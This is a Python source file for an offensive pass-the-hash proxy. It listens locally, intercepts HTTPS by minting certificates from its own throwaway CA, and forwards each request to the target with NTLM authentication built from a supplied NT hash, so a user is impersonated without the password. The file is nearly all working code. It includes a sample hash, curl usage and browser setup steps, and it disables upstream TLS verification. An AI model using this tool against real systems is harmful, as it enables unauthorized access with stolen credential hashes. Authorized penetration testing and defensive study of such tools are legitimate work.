#!/usr/bin/env python3
"""
NTLMv2 pass-the-hash proxy.

Listens on a local port, terminates TLS for CONNECT tunnels (using an
ephemeral CA), and forwards every request to the real target using
NTLM auth built from an NT hash.

Example:
    python3 ./pth_proxy.py --user john --domain DOMAIN --hash 8bf305c62b55c9def1c5c30fb24ff2b8
    curl -v -k -x http://127.0.0.1:3128 https://target.domain.example/
"""

import argparse
import ipaddress
import os
import socket
import socketserver
import ssl
import sys
import tempfile
import threading
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse

import requests
import urllib3
from requests_ntlm import HttpNtlmAuth

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"

HOP_BY_HOP = {
    'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
    'te', 'trailers', 'transfer-encoding', 'upgrade',
}


# --------------------------------------------------------------------------- #
#  Hash helpers
# --------------------------------------------------------------------------- #

def normalize_hash(raw: str) -> str:
    raw = raw.strip()
    if ':' in raw:
        return raw
    if len(raw) == 32:
        return f"{EMPTY_LM}:{raw}"
    raise ValueError(f"Invalid NT hash: {raw!r}")


# --------------------------------------------------------------------------- #
#  On-the-fly certificate authority
# --------------------------------------------------------------------------- #

class CertAuthority:
    """Generates an ephemeral CA and signs per-host leaf certs on demand."""

    def __init__(self, certdir: str):
        self.certdir = certdir
        self._cache: dict[str, tuple[str, str]] = {}
        self._lock = threading.Lock()

        self.ca_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        now = datetime.now(timezone.utc)
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "PTH Proxy CA")])

        self.ca_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(subject)
            .public_key(self.ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=3650))
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True,
            )
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True, key_cert_sign=True, crl_sign=True,
                    key_encipherment=False, content_commitment=False,
                    data_encipherment=False, key_agreement=False,
                    encipher_only=False, decipher_only=False,
                ),
                critical=True,
            )
            .sign(self.ca_key, hashes.SHA256())
        )

        self.ca_pem = os.path.join(certdir, 'ca.pem')
        with open(self.ca_pem, 'wb') as f:
            f.write(self.ca_cert.public_bytes(serialization.Encoding.PEM))

    def leaf_for(self, hostname: str) -> tuple[str, str]:
        with self._lock:
            if hostname in self._cache:
                return self._cache[hostname]

            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            now = datetime.now(timezone.utc)

            sans = [x509.DNSName(hostname)]
            try:
                sans.append(x509.IPAddress(ipaddress.ip_address(hostname)))
            except ValueError:
                pass

            cert = (
                x509.CertificateBuilder()
                .subject_name(x509.Name(
                    [x509.NameAttribute(NameOID.COMMON_NAME, hostname)]
                ))
                .issuer_name(self.ca_cert.subject)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=3650))
                .add_extension(x509.SubjectAlternativeName(sans), critical=False)
                .add_extension(
                    x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]),
                    critical=False,
                )
                .sign(self.ca_key, hashes.SHA256())
            )

            safe = hostname.replace(':', '_').replace('*', '_').replace('/', '_')
            certfile = os.path.join(self.certdir, f"{safe}.crt")
            keyfile = os.path.join(self.certdir, f"{safe}.key")

            with open(certfile, 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            with open(keyfile, 'wb') as f:
                f.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                ))

            self._cache[hostname] = (certfile, keyfile)
            return certfile, keyfile


# --------------------------------------------------------------------------- #
#  Request parsing (byte-by-byte for the outer socket, buffered for TLS inner)
# --------------------------------------------------------------------------- #

def _parse_request_head(raw: bytes):
    text = raw.decode('latin-1')
    head, _, _ = text.partition('\r\n\r\n')
    if not head:
        head = text.partition('\n\n')[0]
    lines = head.replace('\r\n', '\n').split('\n')
    if not lines or not lines[0].strip():
        return None
    parts = lines[0].split(' ', 2)
    if len(parts) < 2:
        return None
    method, target = parts[0], parts[1]
    version = parts[2] if len(parts) > 2 else 'HTTP/1.1'
    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ':' not in line:
            continue
        k, _, v = line.partition(':')
        headers[k.strip()] = v.strip()
    return method, target, version, headers


def read_outer_request(sock: socket.socket, max_head: int = 65536):
    """
    Read an HTTP request from a raw socket one byte at a time so we never
    over-read into a subsequent TLS ClientHello.  Returns
    (method, target, version, headers, body) or None.
    """
    buf = bytearray()
    while True:
        try:
            b = sock.recv(1)
        except (socket.timeout, OSError):
            return None
        if not b:
            return None
        buf += b
        if buf.endswith(b'\r\n\r\n') or buf.endswith(b'\n\n'):
            break
        if len(buf) > max_head:
            return None

    parsed = _parse_request_head(bytes(buf))
    if parsed is None:
        return None
    method, target, version, headers = parsed

    body = b''
    if 'Content-Length' in headers:
        try:
            n = int(headers['Content-Length'])
        except ValueError:
            n = 0
        while len(body) < n:
            try:
                chunk = sock.recv(n - len(body))
            except OSError:
                break
            if not chunk:
                break
            body += chunk

    return method, target, version, headers, body


def read_buffered_request(reader):
    """Read an HTTP request from a buffered file object (post-TLS stream)."""
    line = reader.readline()
    if not line:
        return None
    try:
        parts = line.decode('latin-1').rstrip('\r\n').split(' ', 2)
    except Exception:
        return None
    if len(parts) < 2:
        return None
    method, target = parts[0], parts[1]
    version = parts[2] if len(parts) > 2 else 'HTTP/1.1'

    headers: dict[str, str] = {}
    while True:
        h = reader.readline()
        if not h or h in (b'\r\n', b'\n'):
            break
        try:
            k, _, v = h.decode('latin-1').partition(':')
        except Exception:
            continue
        headers[k.strip()] = v.strip()

    body = b''
    if headers.get('Transfer-Encoding', '').lower() == 'chunked':
        chunks = []
        while True:
            sz_line = reader.readline()
            if not sz_line:
                break
            try:
                sz = int(sz_line.strip().split(b';')[0], 16)
            except ValueError:
                break
            if sz == 0:
                reader.readline()
                break
            chunks.append(reader.read(sz))
            reader.readline()
        body = b''.join(chunks)
    elif 'Content-Length' in headers:
        try:
            n = int(headers['Content-Length'])
        except ValueError:
            n = 0
        if n > 0:
            body = reader.read(n)

    return method, target, version, headers, body


# --------------------------------------------------------------------------- #
#  Proxy handler
# --------------------------------------------------------------------------- #

class ProxyHandler(socketserver.BaseRequestHandler):

    def handle(self):
        try:
            self._run()
        except Exception as e:
            self.server.log(f"handler error: {e!r}")

    # ---- outer dispatcher --------------------------------------------------

    def _run(self):
        sock: socket.socket = self.request
        sock.settimeout(120)

        req = read_outer_request(sock)
        if req is None:
            return
        method, target, version, headers, body = req

        if method == 'CONNECT':
            self._handle_connect(sock, target)
            return

        # Plain HTTP proxy request (absolute URI in request line)
        if not target.startswith(('http://', 'https://')):
            self._send_error(sock, 400, "Bad Request",
                             "Proxy expects CONNECT or absolute-URI")
            return

        u = urlparse(target)
        scheme = u.scheme
        host = u.hostname
        port = u.port or (443 if scheme == 'https' else 80)
        path = u.path or '/'
        if u.query:
            path += '?' + u.query

        if headers.get('Expect', '').lower() == '100-continue':
            sock.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")

        session = self._new_session()
        self._forward_and_reply(sock, session, method, scheme, host, port,
                                path, headers, body, force_close=True)

    # ---- CONNECT: TLS MITM -------------------------------------------------

    def _handle_connect(self, sock: socket.socket, target: str):
        if ':' in target:
            host, _, port_s = target.rpartition(':')
            try:
                port = int(port_s)
            except ValueError:
                self._send_error(sock, 400, "Bad Request", "Bad CONNECT target")
                return
        else:
            host, port = target, 443

        self.server.log(f"CONNECT {host}:{port}")

        # Ack the tunnel
        sock.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")

        # TLS-terminate using a freshly minted leaf cert
        certfile, keyfile = self.server.ca.leaf_for(host)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile, keyfile)
        ctx.set_alpn_protocols(['http/1.1'])  # force HTTP/1.1 — we don't parse h2

        try:
            tls = ctx.wrap_socket(sock, server_side=True)
        except (ssl.SSLError, OSError) as e:
            self.server.log(f"TLS handshake failed for {host}: {e}")
            return

        try:
            tls.settimeout(120)
            self._serve_tunnel(tls, host, port)
        finally:
            try:
                tls.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                tls.close()
            except OSError:
                pass

    def _serve_tunnel(self, tls: ssl.SSLSocket, host: str, port: int):
        reader = tls.makefile('rb')
        session = self._new_session()  # cookies persist for this tunnel

        while True:
            try:
                req = read_buffered_request(reader)
            except (socket.timeout, OSError):
                return
            if req is None:
                return
            method, path, version, headers, body = req

            if headers.get('Expect', '').lower() == '100-continue':
                tls.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")

            keep = self._forward_and_reply(
                tls, session, method, 'https', host, port,
                path, headers, body, force_close=False,
            )
            if not keep:
                return

    # ---- upstream + response ----------------------------------------------

    def _new_session(self) -> requests.Session:
        s = requests.Session()
        s.verify = False
        s.trust_env = False
        s.auth = HttpNtlmAuth(
            self.server.identity,
            self.server.ntlm_hash,
            send_cbt=False,
        )
        if self.server.upstream_proxy:
            s.proxies = {
                'http': self.server.upstream_proxy,
                'https': self.server.upstream_proxy,
            }
        return s

    def _forward_and_reply(self, sock, session, method, scheme, host, port,
                           path, headers, body, force_close) -> bool:
        default_port = (scheme == 'https' and port == 443) or \
                       (scheme == 'http' and port == 80)
        netloc = host if default_port else f"{host}:{port}"
        url = f"{scheme}://{netloc}{path}"

        client_wants_close = headers.get('Connection', '').lower() == 'close'

        fwd_headers = {}
        for k, v in headers.items():
            lk = k.lower()
            if lk in HOP_BY_HOP:
                continue
            if lk in ('host', 'proxy-connection', 'proxy-authorization',
                      'content-length', 'expect', 'accept-encoding'):
                continue
            fwd_headers[k] = v

        try:
            r = session.request(
                method, url,
                headers=fwd_headers,
                data=body if body else None,
                allow_redirects=False,
                stream=False,
                timeout=60,
            )
        except Exception as e:
            self.server.log(f"upstream error {url}: {e}")
            self._write_response(
                sock, 502, "Bad Gateway",
                {'Content-Type': 'text/plain', 'Connection': 'close'},
                str(e).encode(),
            )
            return False

        out = {}
        for k, v in r.headers.items():
            lk = k.lower()
            if lk in HOP_BY_HOP:
                continue
            if lk in ('content-encoding', 'content-length'):
                continue
            out[k] = v
        out['Content-Length'] = str(len(r.content))

        if force_close or client_wants_close:
            out['Connection'] = 'close'

        self._write_response(sock, r.status_code, r.reason, out, r.content)

        self.server.log(
            f"{method} {url} -> {r.status_code} ({len(r.content)} bytes)"
        )
        return not (force_close or client_wants_close)

    # ---- raw response writer ---------------------------------------------

    def _write_response(self, sock, status, reason, headers, body):
        lines = [f"HTTP/1.1 {status} {reason}"]
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        head = ("\r\n".join(lines) + "\r\n\r\n").encode('latin-1')
        try:
            sock.sendall(head + (body or b''))
        except OSError as e:
            self.server.log(f"write error: {e}")

    def _send_error(self, sock, code, reason, msg):
        body = msg.encode()
        self._write_response(sock, code, reason, {
            'Content-Type': 'text/plain',
            'Content-Length': str(len(body)),
            'Connection': 'close',
        }, body)


# --------------------------------------------------------------------------- #
#  Server
# --------------------------------------------------------------------------- #

class ThreadedProxy(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, handler, *, ca, identity, ntlm_hash,
                 upstream_proxy, log_fn):
        self.ca = ca
        self.identity = identity
        self.ntlm_hash = ntlm_hash
        self.upstream_proxy = upstream_proxy
        self._log_fn = log_fn
        super().__init__(addr, handler)

    def log(self, msg: str):
        self._log_fn(msg)


# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #

def parse_args():
    p = argparse.ArgumentParser(
        description="NTLMv2 pass-the-hash HTTP/HTTPS MITM proxy.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument('--listen', default='127.0.0.1', help='Bind address')
    p.add_argument('--port', type=int, default=3128, help='Listen port')
    p.add_argument('--user', required=True, help='Username (without domain)')
    p.add_argument('--domain', default='', help='Domain / NetBIOS name')
    p.add_argument('--hash', dest='ntlm_hash', required=True,
                   help="'LM:NT' or bare 32-char NT hash")
    p.add_argument('--ca-dir', default=None,
                   help='Where to store generated CA + leaf certs')
    p.add_argument('--upstream-proxy', default=None,
                   help='Optional upstream HTTP proxy (host:port)')
    return p.parse_args()


def main():
    args = parse_args()

    try:
        ntlm_hash = normalize_hash(args.ntlm_hash)
    except ValueError as e:
        print(f"[-] {e}")
        return 2

    identity = f"{args.domain}\\{args.user}" if args.domain else args.user

    ca_dir = args.ca_dir or tempfile.mkdtemp(prefix='pth-proxy-')
    os.makedirs(ca_dir, exist_ok=True)
    ca = CertAuthority(ca_dir)

    def log(msg):
        print(f"[proxy] {msg}", flush=True)

    server = ThreadedProxy(
        (args.listen, args.port),
        ProxyHandler,
        ca=ca,
        identity=identity,
        ntlm_hash=ntlm_hash,
        upstream_proxy=args.upstream_proxy,
        log_fn=log,
    )

    print(f"[*] Listening      : {args.listen}:{args.port}")
    print(f"[*] Identity       : {identity}")
    print(f"[*] NTLM hash      : {ntlm_hash}")
    print(f"[*] CA certificate : {ca.ca_pem}")
    if args.upstream_proxy:
        print(f"[*] Upstream proxy : {args.upstream_proxy}")
    print()
    print("curl usage:")
    print(f"  curl -x http://{args.listen}:{args.port} -k https://TARGET/")
    print(f"  curl -x http://{args.listen}:{args.port} "
          f"--cacert {ca.ca_pem} https://TARGET/   # if you want verification")
    print()
    print("Firefox usage:")
    print("  1. Preferences -> Network Settings -> Manual proxy")
    print(f"     HTTP Proxy: {args.listen}   Port: {args.port}   [x] Also use for HTTPS")
    print("  2. Preferences -> Privacy & Security -> Certificates -> View Certificates")
    print(f"     Authorities -> Import -> {ca.ca_pem} -> Trust for websites")
    print()
    print("Press Ctrl+C to stop.")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
    finally:
        server.server_close()


if __name__ == '__main__':
    sys.exit(main() or 0)
